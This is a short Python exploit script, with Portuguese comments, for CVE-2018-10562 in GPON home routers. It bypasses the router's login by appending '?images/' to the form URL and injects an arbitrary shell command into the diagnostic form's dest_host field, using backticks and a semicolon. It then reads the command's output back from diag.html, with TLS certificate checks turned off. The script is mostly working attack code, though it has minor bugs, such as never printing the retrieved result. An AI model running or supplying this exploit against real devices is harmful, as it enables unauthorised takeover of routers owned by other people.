#!/usr/bin/env python

import sys
import requests
import time
import urllib.request as urllib2
import requests
import ssl

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE


def banner():
	ascii_art = """
  ________________________________________________________________
    	[*] GPON Remote Code Execution (CVE-2018-10562) [*]	
  ________________________________________________________________
	"""
print("")

def retrieve_results(target, command):
	try:
		fp = urllib2.urlopen(target + '/diag.html?images/', context=ctx)
		for line in fp.readlines():
			if 'diag_result = \"Can\'t resolv hostname for' in line:
				start = '['
				end = ';' + command +']'
				res = str(line[line.find(start)+len(start):line.rfind(end)])
				return res.replace('\\n', '\n')
	except Exception as e:
		print("[*] Ocorreu um erro ao recuperar o resultado")

def send_command(url_bypass, payload):
	print ("[*] Injetando comando..")
	try:
		req = requests.Request('POST', url_bypass, data=payload)
		prepared = req.prepare()
		s = requests.Session()
		s.send(prepared)
	except Exception as e:
		pass


if __name__ == "__main__":
	try:		
		banner()
		# Obtendo os parâmetros
		domain = sys.argv[1]
		command = sys.argv[2]
		# Criando url + payload
		url_bypass = domain + '/GponForm/diag_Form?images/'
		payload = 'XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=`' + command + '`;' + command + '&ipv=0'
		# Injetando o comando
		send_command(url_bypass, payload)
		print("[*] Aguardando resultados..")
		time.sleep(3)
		print("[*] Obtendo os resultados..")
		# Recuperando a saída (resultado)
		out = retrieve_results(domain, command)
		print("[*] Tente novamente!")

	except Exception as e:
		print("[Erro] Deve usar: python gpon_rce.py URL COMANDO")
		print("[Erro] e.x : python gpon_rce.py http://192.168.1.15 \'id\'\n"		)
